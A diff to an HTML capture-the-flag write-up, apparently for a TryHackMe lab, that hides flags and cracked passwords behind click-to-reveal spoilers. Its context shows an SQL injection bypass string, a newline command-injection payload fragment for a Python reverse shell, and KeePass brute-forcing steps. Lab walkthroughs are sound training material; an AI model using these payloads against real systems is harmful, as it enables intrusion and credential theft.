@@ -379,6 +379,21 @@
     }
     .takeaway-text { font-size: 14px; color: var(--text); }
 
+    /* SPOILER */
+    .spoiler {
+      background: var(--text-faint);
+      color: transparent;
+      border-radius: 3px;
+      cursor: pointer;
+      user-select: none;
+      transition: background 0.2s, color 0.2s;
+      padding: 0 2px;
+    }
+    .spoiler.revealed {
+      background: transparent;
+      color: inherit;
+    }
+
     /* FOOTER */
     footer {
       border-top: 1px solid var(--border);
@@ -452,11 +467,11 @@
     <table class="flags-table">
       <tr>
         <td>User</td>
-        <td>THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}</td>
+        <td><span class="spoiler" title="click to reveal">THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}</span></td>
       </tr>
       <tr>
         <td>Root</td>
-        <td>THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}</td>
+        <td><span class="spoiler" title="click to reveal">THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}</span></td>
       </tr>
     </table>
   </div>
@@ -467,7 +482,7 @@
     <div class="chain-step"><span class="chain-arrow">02</span><span class="chain-text">Command injection via <code>%0a</code> newline — WAF bypass</span></div>
     <div class="chain-step"><span class="chain-arrow">03</span><span class="chain-text">www-data shell → secret.config → sysadmin creds</span></div>
     <div class="chain-step"><span class="chain-arrow">04</span><span class="chain-text">SSH as sysadmin → user flag → infrastructure.kdbx</span></div>
-    <div class="chain-step"><span class="chain-arrow">05</span><span class="chain-text">pykeepass brute (KDBX v4) → password: spring → root creds</span></div>
+    <div class="chain-step"><span class="chain-arrow">05</span><span class="chain-text">pykeepass brute (KDBX v4) → password: <span class="spoiler" title="click to reveal">spring</span> → root creds</span></div>
     <div class="chain-step"><span class="chain-arrow">06</span><span class="chain-text">su root → root flag</span></div>
   </div>
 
@@ -586,7 +601,7 @@ target=<span class="st">127.0.0.1%0apython3+-c+'import+socket,subprocess,os;s=so
       </div>
       <pre>[backup_agent]
 run_as   = <span class="st">sysadmin</span>
-password = <span class="st">S3cur3Backup$Acc3ss!</span></pre>
+password = <span class="st"><span class="spoiler" title="click to reveal">S3cur3Backup$Acc3ss!</span></span></pre>
     </div>
 
     <p>Credentials in plaintext. In a config file. Owned by the web process. Bold strategy.</p>
@@ -597,7 +612,7 @@ password = <span class="st">S3cur3Backup$Acc3ss!</span></pre>
         <button class="copy-btn" onclick="copyCode(this)">copy</button>
       </div>
       <pre>ssh sysadmin@10.48.180.35
-<span class="cm"># password: S3cur3Backup$Acc3ss!</span></pre>
+<span class="cm"># password: <span class="spoiler" title="click to reveal">S3cur3Backup$Acc3ss!</span></span></pre>
     </div>
 
     <p>User flag located at the usual spot. Also found <code>~/backups/infrastructure.kdbx</code> — a KeePass database. Things are getting interesting.</p>
@@ -655,10 +670,10 @@ pip install pykeepass</pre>
         <span class="code-lang">output</span>
         <button class="copy-btn" onclick="copyCode(this)">copy</button>
       </div>
-      <pre>[+] FOUND: <span class="st">spring</span></pre>
+      <pre>[+] FOUND: <span class="st"><span class="spoiler" title="click to reveal">spring</span></span></pre>
     </div>
 
-    <p>The sysadmin who runs an internal infrastructure monitoring platform, stores root credentials in KeePass, and locks it with the password <code>spring</code>. Truly a legend of our time.</p>
+    <p>The sysadmin who runs an internal infrastructure monitoring platform, stores root credentials in KeePass, and locks it with the password <code><span class="spoiler" title="click to reveal">spring</span></code>. Truly a legend of our time.</p>
 
     <p>Dump all entries:</p>
 
@@ -668,7 +683,7 @@ pip install pykeepass</pre>
         <button class="copy-btn" onclick="copyCode(this)">copy</button>
       </div>
       <pre><span class="kw">from</span> pykeepass <span class="kw">import</span> PyKeePass
-kp = <span class="fn">PyKeePass</span>(<span class="st">"infrastructure.kdbx"</span>, password=<span class="st">"spring"</span>)
+kp = <span class="fn">PyKeePass</span>(<span class="st">"infrastructure.kdbx"</span>, password=<span class="st">"<span class="spoiler" title="click to reveal">spring</span>"</span>)
 <span class="kw">for</span> e <span class="kw">in</span> kp.entries:
     <span class="fn">print</span>(e.title, e.username, e.password)</pre>
     </div>
@@ -676,7 +691,7 @@ kp = <span class="fn">PyKeePass</span>(<span class="st">"infrastructure.kdbx"</s
     <table>
       <thead><tr><th>Title</th><th>Username</th><th>Password</th></tr></thead>
       <tbody>
-        <tr><td>Root User Password - Sensitive</td><td>root</td><td>S3cur3P4ss0nK33p4ss</td></tr>
+        <tr><td>Root User Password - Sensitive</td><td>root</td><td><span class="spoiler" title="click to reveal">S3cur3P4ss0nK33p4ss</span></td></tr>
         <tr><td>Sample Entry #2</td><td>Michael321</td><td>12345</td></tr>
       </tbody>
     </table>
@@ -695,10 +710,10 @@ kp = <span class="fn">PyKeePass</span>(<span class="st">"infrastructure.kdbx"</s
         <button class="copy-btn" onclick="copyCode(this)">copy</button>
       </div>
       <pre>su root
-<span class="cm"># password: S3cur3P4ss0nK33p4ss</span>
+<span class="cm"># password: <span class="spoiler" title="click to reveal">S3cur3P4ss0nK33p4ss</span></span>
 
 cat /root/root.txt
-<span class="cm"># THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}</span></pre>
+<span class="cm"># <span class="spoiler" title="click to reveal">THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}</span></span></pre>
     </div>
   </div>
 
@@ -712,9 +727,9 @@ cat /root/root.txt
       <thead><tr><th>User</th><th>Password / Method</th><th>Source</th></tr></thead>
       <tbody>
         <tr><td>netops (web)</td><td>' OR 1=1--</td><td>SQLi auth bypass</td></tr>
-        <tr><td>sysadmin</td><td>S3cur3Backup$Acc3ss!</td><td>secret.config</td></tr>
-        <tr><td>KeePass</td><td>spring</td><td>rockyou brute (pykeepass)</td></tr>
-        <tr><td>root</td><td>S3cur3P4ss0nK33p4ss</td><td>KeePass entry</td></tr>
+        <tr><td>sysadmin</td><td><span class="spoiler" title="click to reveal">S3cur3Backup$Acc3ss!</span></td><td>secret.config</td></tr>
+        <tr><td>KeePass</td><td><span class="spoiler" title="click to reveal">spring</span></td><td>rockyou brute (pykeepass)</td></tr>
+        <tr><td>root</td><td><span class="spoiler" title="click to reveal">S3cur3P4ss0nK33p4ss</span></td><td>KeePass entry</td></tr>
       </tbody>
     </table>
   </div>
@@ -739,6 +754,10 @@ cat /root/root.txt
 </div>
 
 <script>
+  document.querySelectorAll('.spoiler').forEach(el => {
+    el.addEventListener('click', () => el.classList.toggle('revealed'));
+  });
+
   function copyCode(btn) {
     const pre = btn.closest('.code-block').querySelector('pre');
     navigator.clipboard.writeText(pre.innerText).then(() => {
